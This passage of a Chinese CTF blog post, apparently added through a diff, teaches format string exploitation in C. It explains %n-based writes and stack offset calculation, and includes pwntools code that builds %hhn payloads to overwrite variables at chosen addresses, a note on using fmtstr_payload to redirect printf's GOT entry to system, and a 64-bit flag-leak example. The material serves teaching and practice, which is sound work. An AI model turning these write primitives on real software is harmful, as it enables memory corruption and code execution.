赋值为回显的长度</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, number);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%48d%n\n&quot;</span>, number, &amp;number);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, number);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>重新运行一下，可以看到在新增代码后 <code>number</code> 的值变为了 48，其中 <code>%48d</code> 对应的长度 48 便是新赋值内容</p>
+<p>下面以一个实际例子进行练习：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">int</span> a = <span class="hljs-number">123</span>, b = <span class="hljs-number">456</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> c = <span class="hljs-number">789</span>;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;c);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>对于上述过程我们期望修改 c 使其进入到 <code>modified c</code> 分支</p>
+<p>经过调试我们可以看到对应的 c 的地址为 <code>0xffffcebc</code> 对应的格式化字符串第一个参数位置为 <code>0xffffce44</code> 相应的则 c 位于 <code>(0xffffcebc - 0xffffce44)/4 = 30</code> 即第 30 个参数，事实上当我们输入 <code>%30$p</code> 的时候不能输出对应的值，需要修改为 <code>%31$p</code>，其实调试也可以看到对应的栈，此处省略</p>
+<p><img src="https://s2.loli.net/2025/10/21/CNdhKuwWvZ9tAcP.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>同时经过简单的调试我们可以找到格式化字符串相当于 <code>printf</code> 函数的第 7 个参数，相当于格式化字符串的第 6 个参数</p>
+<blockquote>
+<p>此时与 <em>输出函数</em> 输出后的为<a href="#%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E">第 k+1 个参数</a>，相对应</p>
+</blockquote>
+<img src="https://s2.loli.net/2025/10/27/ecB9XQNWL8PdvOa.png" srcset="/img/loading.gif" lazyload style="zoom: 67%;" />
+<p>我们可以读取任意位置的参数后应该如何进行修改栈上数据呢？此时便用到了之前提到的 <code>%n</code></p>
+<blockquote>
+<p>当我们提供一个地址的时候，使用 <a href="#%25n">%n</a> 便会将前面的输出长度写入到该地址中</p>
+</blockquote>
+<p>上面的代码中会将 c 的地址进行输出，因此我们可以构造 Payload 如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">c_addr = <span class="hljs-built_in">int</span>(rl(), <span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">f&quot;c_addr -------------&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(c_addr)&#125;</span>&quot;</span>)<br>payload = p32(c_addr) + <span class="hljs-string">b&#x27;%12d&#x27;</span> + <span class="hljs-string">b&#x27;%6$n&#x27;</span> <span class="hljs-comment"># 4 + 12 = 16</span><br>log.info(<span class="hljs-string">f&quot;payload: <span class="hljs-subst">&#123;payload&#125;</span>&quot;</span>)<br>sl(payload)<br></code></pre></td></tr></table></figure>
+<img src="https://s2.loli.net/2025/10/27/v8UVXL3rlAWy67g.png" srcset="/img/loading.gif" lazyload style="zoom:67%;" />
+<p><strong>小结：</strong></p>
+<p>对于覆盖栈上地址我们可以找到对应变量在栈中的地址，可以采用下述格式的 Payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p32(&lt;modify_addr&gt;) + <span class="hljs-string">b&#x27;%&lt;padding&gt;d&#x27;</span> + <span class="hljs-string">b&#x27;%&lt;position&gt;$n&#x27;</span> <span class="hljs-comment"># 4 + padding = write_value</span><br></code></pre></td></tr></table></figure>
+<h4 id="任意地址小数据修改">任意地址小数据修改</h4>
+<p>上述过程中主要针对的是栈上的数据，那么对于我们全局初始化的数据怎么修改呢，其实也是一样的，但是我们不一定局限于输入的地址在最前面，可以是在后面</p>
+<p>以修改 <code>a</code> 为例，我们修改其为 2 则会进入分支，输出 <code>modified a for a small number.</code></p>
+<p>通过 <code>readelf -s modify</code> 可以看到对应 <code>a</code> 符号对应的地址信息为 <code>0804c024</code></p>
+<p><img src="https://s2.loli.net/2025/10/27/dCm5ypDcPLoJgAU.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>那么对应的我们可以构造以下 Payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">a_addr = <span class="hljs-number">0x804c024</span><br>payload = <span class="hljs-string">b&#x27;aa%&lt;position&gt;$naa&#x27;</span> + p32(a_addr) <span class="hljs-comment"># 2 = write_value</span><br></code></pre></td></tr></table></figure>
+<p>对应的我们的 position 是多少呢？</p>
+<p>此时对应的存储的格式化字符串已经占据了 6 个字符的位置，如果我们再添加两个字符 aa，那么其实 <code>aa%&lt;position&gt;</code> 就是第 6 个参数， <code>$naa</code> 其实就是第 7 个参数，后面我们如果跟上我们要覆盖的地址，那就是第 8 个参数，所以如果我们这里设置 k 为 8，其实就可以覆盖了</p>
+<p>所以最后的 Payload 为：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">a_addr = <span class="hljs-number">0x804c024</span><br>payload = <span class="hljs-string">b&#x27;aa%8$naa&#x27;</span> + p32(a_addr) <span class="hljs-comment"># 2 = write_value</span><br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>**TIPs：**没有必要把地址放在最前面，放在哪里都可以，只要我们可以找到其对应的偏移即可</p>
+</blockquote>
+<h4 id="任意地址大数据修改">任意地址大数据修改</h4>
+<p>对于大数字而言，我们如果常用 <code>%&lt;num&gt;d%&lt;pos&gt;$n</code> 的方式来 Padding 的话，对应的输出长度有点不太能够接受</p>
+<p>因为大数个字节输入伴随而来的是较长的输出时间以及不确定能否成功利用的问题，对此我们需要换一种方式进行利用</p>
+<p>在格式化字符串中存在有 <code>hh</code> 以及 <code>h</code> 的类型长度</p>
+<blockquote>
+<p>hh 对于整数类型，printf 期待一个从 char 提升的 int 尺寸的整型参数<br>
+h  对于整数类型，printf 期待一个从 short 提升的 int 尺寸的整型参数</p>
+</blockquote>
+<p>所以说，我们可以利用 <code>%hhn</code> 向某个地址写入单字节，利用 <code>%hn</code> 向某个地址写入双字节</p>
+<p>在之前的截图中我们可以看到 <code>b</code> 的地址为 <code>0804c028</code>，而在内存中对应的大数据是按照小端序进行存储的，所以期望修改后对应的存储方式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x0804C028 \x78  # 120<br>0x0804C029 \x56  # 86<br>0x0804C02A \x34  # 52<br>0x0804C02B \x12  # 18<br></code></pre></td></tr></table></figure>
+<p>对应的 Payload 为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p32(<span class="hljs-number">0x0804C028</span>)+p32(<span class="hljs-number">0x0804C029</span>)+p32(<span class="hljs-number">0x0804C02A</span>)+p32(<span class="hljs-number">0x0804C02B</span>)<br>payload += pad1 + <span class="hljs-string">&#x27;%6$hhn&#x27;</span> + pad2 + <span class="hljs-string">&#x27;%7$hhn&#x27;</span>+ pad3 + <span class="hljs-string">&#x27;%8$hhn&#x27;</span> + pad4 + <span class="hljs-string">&#x27;%9$hhn&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>对应的我们需要进行求解不同的 4 个 pad 值，对应的计算方式如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># pad1 </span><br><span class="hljs-number">120</span> - <span class="hljs-number">4</span> * <span class="hljs-number">4</span> = <span class="hljs-number">104</span><br><span class="hljs-comment"># 0x78 - 4 * 4 </span><br><br><span class="hljs-comment"># pad2</span><br><span class="hljs-number">256</span> + <span class="hljs-number">86</span> - <span class="hljs-number">120</span> = <span class="hljs-number">222</span><br><span class="hljs-comment"># 0x156 - 0x78</span><br><br><span class="hljs-comment"># pad3 </span><br><span class="hljs-number">256</span> + <span class="hljs-number">52</span> - <span class="hljs-number">86</span> = <span class="hljs-number">222</span><br><span class="hljs-comment"># 0x134 - 0x56</span><br><br><span class="hljs-comment"># pad4</span><br><span class="hljs-number">256</span> + <span class="hljs-number">18</span> - <span class="hljs-number">52</span> = <span class="hljs-number">222</span><br><span class="hljs-comment"># 0x112 - 0x34</span><br></code></pre></td></tr></table></figure>
+<p>程序形式表示为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt</span>(<span class="hljs-params">prev, word, index</span>):</span><br>    <span class="hljs-keyword">if</span> prev &lt; word:<br>        result = word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    <span class="hljs-keyword">elif</span> prev == word:<br>        result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        result = <span class="hljs-number">256</span> + word - prev <span class="hljs-comment"># overflow to fit low 16 bits</span><br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    fmtstr += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;$hhn&quot;</span><br>    <span class="hljs-comment"># print(fmtstr)</span><br>    <span class="hljs-keyword">return</span> fmtstr<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_str</span>(<span class="hljs-params">offset, size, addr, target</span>):</span><br>    payload = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> size == <span class="hljs-number">4</span>:<br>            payload += p32(addr + i)<br>        <span class="hljs-keyword">else</span>:<br>            payload += p64(addr + i)<br>    prev = <span class="hljs-built_in">len</span>(payload) <span class="hljs-comment"># padding addr len</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        payload += fmt(prev, (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>, offset + i).encode()<br>        prev = (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> payload<br><br>payload = fmt_str(<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0x0804C028</span>,<span class="hljs-number">0x12345678</span>)<br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure>
+<p>最后运行可以得到：</p>
+<p><img src="https://s2.loli.net/2025/10/27/OzGsltY5pNmarfH.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>其实在 pwntools 中也内置了一个格式化字符串利用的函数 <code>fmtstr_payload</code> 其使用方式如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 一</span><br>payload = fmtstr_payload(offset, &#123;addr: value&#125;) <span class="hljs-comment"># (偏移，&#123;需要修改的地址：想要修改的值&#125;) </span><br><br><span class="hljs-comment"># 二函数原型</span><br>fmtstr_payload(offset, writes, numbwritten=<span class="hljs-number">0</span>, write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br><span class="hljs-comment"># 第一个参数表示格式化字符串的偏移；</span><br><span class="hljs-comment"># 第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT:systemAddress&#125;；</span><br><span class="hljs-comment"># 第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；</span><br><span class="hljs-comment"># 第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。</span><br></code></pre></td></tr></table></figure>
+<h3 id="x64">x64</h3>
+<p>64位下的格式化字符串与32位相似，但是对于64位有些独特之处在于其前六个参数是通过寄存器传递，当参数多余六个的时候便会通过栈来传递</p>
+<p>下面以 2017 年的 UIUCTF 中 <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/2017-UIUCTF-pwn200-GoodLuck">pwn200 GoodLuck</a> 为例进行介绍</p>
+<p><img src="https://s2.loli.net/2025/10/28/JEruOnsBD5TNv6b.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>调试可以看到 flag 读入后在栈上的第 5 个位置，除去 <code>rsp</code> 的返回地址则为第 4 个位置，那么我们依据前面提到的 <code>x64</code> 下的传参规则，前六个参数是通过寄存器传参，那么对应 flag 的位置应该是 <code>6 + 4 = 10</code>，但是在格式化字符串中对应的偏移应该是相较于输入的内容的，则对应的 flag 应该是第 9 位，则使用 <code>%9$n</code> 进行读取即可</p>
+<p>对于 PWNGDB 中内置了对应格式化字符串的小工具 <code>fmtarg</code>，使用该工具的前提是断在了 <code>printf</code> 上，其会帮我们自动计算对应的格式化参数值</p>
+<p><img src="https://s2.loli.net/2025/10/28/ixYjwEokyeBTPXs.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>那么对应的我们便可以构造出 Payload 如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;%9$s&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2025/10/28/TyfFAjroeMZwBQR.png" srcset="/img/loading.gif" lazyload alt=""></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://equinox-shame.github.io/2025/10/28/格式化字符串/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>梓曰</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/10/28/%E4%B8%AD%E7%BA%A7ROP/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/28/get_started_3dsctf_2016/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"2aM6IUUWOeDGCZaDdRhrvLam-gzGzoHsz","appKey":"GQdXw2PjI9DScgw5QHVCZeYm","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"","emojiCDN":"//i0.hdslb.com/bfs/emote/","emojiMaps":{"脱单doge":"bf7e00ecab02171f8461ee8cf439c73db9797748.png","热":"4e58a2a6f5f1580ac33df2d2cf7ecad7d9ab3635.png","微笑":"685612eadc33f6bc233776c6241813385844f182.png","口罩":"3ad2f66b151496d2a5fb0a8ea75f32265d778dd3.png","doge":"3087d273a78ccaff4bb1e9972e2ba2a7583c9f11.png","妙啊":"b4cb77159d58614a9b787b91b1cd22a81f383535.png","OK":"4683fd9ffc925fa6423110979d7dcac5eda297f4.png","星星眼":"63c9d1a31c0da745b61cdb35e0ecb28635675db2.png","辣眼睛":"35d62c496d1e4ea9e091243fa812866f5fecc101.png","吃瓜":"4191ce3c44c2b3df8fd97c33f85d3ab15f4f3c84.png","滑稽":"d15121545a99ac46774f1f4465b895fe2d1411c3.png","呲牙":"b5a5898491944a4268360f2e7a84623149672eb6.png","打call":"431432c43da3ee5aab5b0e4f8931953e649e9975.png","歪嘴":"4384050fbab0586259acdd170b510fe262f08a17.png","调皮":"8290b7308325e3179d2154327c85640af1528617.png","翻白眼":"eba54707c7168925b18f6f8b1f48d532fe08c2b1.png","灵魂出窍":"43d3db7d97343c01b47e22cfabeca84b4251f35a.png","再见":"fc510306bae26c9aec7e287cdf201ded27b065b9.png","嗑瓜子":"28a91da1685d90124cfeead74622e1ebb417c0eb.png","笑哭":"c3043ba94babf824dea03ce500d0e73763bf4f40.png","藏狐":"ba0937ef6f3ccca85e2e0047e6263f3b4da37201.png","脸红":"0922c375da40e6b69002bd89b858572f424dcfca.png","给心心":"1597302b98827463f5b75c7cac1f29ea6ce572c4.png","嘟嘟":"abd7404537d8162720ccbba9e0a8cdf75547e07a.png","哦呼":"362bded07ea5434886271d23fa25f5d85d8af06c.png","喜欢":"8a10a4d73a89f665feff3d46ca56e83dc68f9eb8.png","酸了":"92b1c8cbceea3ae0e8e32253ea414783e8ba7806.png","嫌弃":"de4c0783aaa60ec03de0a2b90858927bfad7154b.png","大哭":"2caafee2e5db4db72104650d87810cc2c123fc86.png","害羞":"9d2ec4e1fbd6cb1b4d12d2bbbdd124ccb83ddfda.png","疑惑":"b7840db4b1f9f4726b7cb23c0972720c1698d661.png","喜极而泣":"485a7e0c01c2d70707daae53bee4a9e2e31ef1ed.png","奸笑":"bb84906573472f0a84cebad1e9000eb6164a6f5a.png","阴险":"ba8d5f8e7d136d59aab52c40fd3b8a43419eb03c.png","囧":"12e41d357a9807cc80ef1e1ed258127fcc791424.png","呆":"33ad6000d9f9f168a0976bc60937786f239e5d8c.png","大笑":"ca94ad1c7e6dac895eb5b33b7836b634c614d1c0.png","惊喜":"0afecaf3a3499479af946f29749e1a6c285b6f65.png","doge_金箍":"aadaca1895e09c5596fc6365192ec93a23718cf0.png","奋斗":"bb2060c15dba7d3fd731c35079d1617f1afe3376.png","哈欠":"888d877729cbec444ddbd1cf4c9af155a7a06086.png","抓狂":"4c87afff88c22439c45b79e9d2035d21d5622eba.png","偷笑":"6c49d226e76c42cd8002abc47b3112bc5a92f66a.png","惊讶":"f8e9a59cad52ae1a19622805696a35f0a0d853f3.png","抠鼻":"cb89184c97e3f6d50acfd7961c313ce50360d70f.png","捂脸":"6921bb43f0c634870b92f4a8ad41dada94a5296d.png","无语":"44667b7d9349957e903b1b62cb91fb9b13720f04.png","点赞":"1a67265993913f4c35d15a6028a30724e83e7d35.png","笑":"81edf17314cea3b48674312b4364df44d5c01f17.png","傲娇":"010540d0f61220a0db4922e4a679a1d8eca94f4e.png","冷":"cb0ebbd0668640f07ebfc0e03f7a18a8cd00b4ed.png","委屈":"d2f26cbdd6c96960320af03f5514c5b524990840.png","尴尬":"cb321684ed5ce6eacdc2699092ab8fe7679e4fda.png","生气":"3195714219c4b582a4fb02033dd1519913d0246d.png","生病":"0f25ce04ae1d7baf98650986454c634f6612cb76.png","疼":"905fd9a99ec316e353b9bd4ecd49a5f0a301eabf.png","鼓掌":"895d1fc616b4b6c830cf96012880818c0e1de00d.png","保佑":"fafe8d3de0dc139ebe995491d2dac458a865fb30.png","加油":"c7aaeacb21e107292d3bb053e5abde4a4459ed30.png","响指":"1b5c53cf14336903e1d2ae3527ca380a1256a077.png","嘘声":"e64af664d20716e090f10411496998095f62f844.png","墨镜":"3a03aebfc06339d86a68c2d893303b46f4b85771.png","思考":"cfa9b7e89e4bfe04bbcd34ccb1b0df37f4fa905c.png","抱拳":"89516218158dbea18ab78e8873060bf95d33bbbe.png","捂眼":"c5c6d6982e1e53e478daae554b239f2b227b172b.png","撇嘴":"531863568e5668c5ac181d395508a0eeb1f0cda4.png","支持":"3c210366a5585706c09d4c686a9d942b39feeb50.png","生气_金箍":"fb3fbcf44157a5ba460b62341a86b38c11e7a664.png","胜利":"b49fa9f4b1e7c3477918153b82c60b114d87347c.png","难过":"a651db36701610aa70a781fa98c07c9789b11543.png","雪花":"a41813c4edf8782047e172c884ebd4507ce5e449.png","黑眼圈_金箍":"3d8edacc6efa4bc397642ee2bdc688c2eb976b4f.png"},"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://equinox-shame.github.io" target="_blank" rel="nofollow noopener"><span>梓曰</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
